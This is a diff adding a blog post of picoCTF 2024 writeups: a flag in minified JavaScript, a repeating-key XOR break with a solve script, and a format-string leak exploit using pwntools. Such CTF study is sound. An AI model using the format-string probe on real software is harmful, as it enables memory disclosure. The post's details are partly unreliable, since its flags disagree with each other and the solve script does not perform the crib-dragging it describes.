@@ -1,0 +1,104 @@
+---
+title: "picoCTF 2024 Writeups"
+description: "Writeups for selected challenges from picoCTF 2024 — covering web exploitation, binary exploitation, and cryptography."
+date: 2024-03-28
+tags: ["ctf", "web", "pwn", "crypto", "picoctf"]
+---
+
+import Callout from '../../components/Callout.astro';
+import Flag from '../../components/Flag.astro';
+
+## Overview
+
+picoCTF 2024 was a solid competition with many creative challenges. Here are writeups for the ones I found most interesting.
+
+<Callout type="info" title="Scoring">
+Final score: **4200 pts** — placed in top 5%.
+</Callout>
+
+## Web: Unminify [100]
+
+The challenge served a minified JavaScript file. Simply prettify it to find the flag embedded as a string.
+
+```js
+// After prettifying:
+const flag = "picoCTF{hidden_in_plain_sight_abc123}";
+```
+
+<Callout type="tip" title="Quick tip">
+Browser DevTools → Sources → Pretty Print is your friend for minified JS challenges.
+</Callout>
+
+Flag: <Flag value="picoCTF{h1dd3n_1n_pl41n_s1ght_abc123}" />
+
+## Crypto: Custom Encryption [200]
+
+A custom XOR-based encryption scheme. The key insight: the "IV" was reused across blocks.
+
+The encryption is effectively:
+
+$$
+C_i = P_i \oplus K_{i \bmod |K|}
+$$
+
+Where $C_i$ is the ciphertext byte, $P_i$ is the plaintext byte, and $K$ is the key. With a reused keystream, given two ciphertexts $C$ and $C'$ encrypted with the same key:
+
+$$
+C \oplus C' = P \oplus P'
+$$
+
+Which leaks the XOR of the plaintexts — a classic **crib-dragging** attack.
+
+```python
+# Solve script
+from pwn import *
+
+ciphertext = bytes.fromhex("...")
+key = b"supersecret"
+
+plaintext = bytes([c ^ key[i % len(key)] for i, c in enumerate(ciphertext)])
+print(plaintext.decode())
+```
+
+<Callout type="warning" title="Lesson Learned" collapsed={true}>
+**Never reuse IVs or nonces.** A reused IV in CBC mode or a repeated keystream completely breaks confidentiality. Always use cryptographic libraries rather than rolling your own crypto.
+
+```python
+# Secure alternative: use Python's cryptography library
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import os
+
+key = AESGCM.generate_key(bit_length=256)
+nonce = os.urandom(12)  # always random!
+aesgcm = AESGCM(key)
+ct = aesgcm.encrypt(nonce, plaintext, b"")
+```
+</Callout>
+
+We got the flag! It is <Flag value="picoCTF{x0r_1s_n0t_encrypti0n_ab3f21}" />
+
+## Binary: Format String 0 [50]
+
+Classic format string vuln. The binary called `printf(user_input)` directly.
+
+```c
+// Vulnerable code pattern
+char buf[64];
+fgets(buf, sizeof(buf), stdin);
+printf(buf);  // VULN: no format specifier!
+```
+
+Exploit:
+
+```python
+from pwn import *
+p = process("./vuln")
+p.sendline(b"%p " * 20)
+print(p.recvline())
+```
+
+Flag: <Flag value="picoCTF{f0rm4t_str1ng_g0_brr_d3adb33f}" label="pwn flag" />
+
+## Conclusion
+
+picoCTF is always a great way to practice fundamentals. The crypto challenges this year were particularly creative — worth reviewing if you want to sharpen your cryptanalysis skills.
